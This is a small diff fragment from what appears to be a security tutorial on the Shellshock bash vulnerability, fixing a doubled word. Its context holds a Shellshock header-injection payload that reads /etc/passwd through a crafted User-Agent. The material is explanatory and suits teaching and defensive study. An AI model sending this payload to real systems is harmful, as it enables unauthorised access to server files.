@@ -144,7 +144,7 @@ Now that we have a way to inject into environment variables remotely, let's put 
 
 ## Sending The Shock
 
-Using the same old bash script that we are running, this time let's inject inject something interesting into the user agent header.
+Using the same old bash script that we are running, this time let's inject something interesting into the user agent header.
 
 ```bash
 () { :; }; echo $(</etc/passwd)
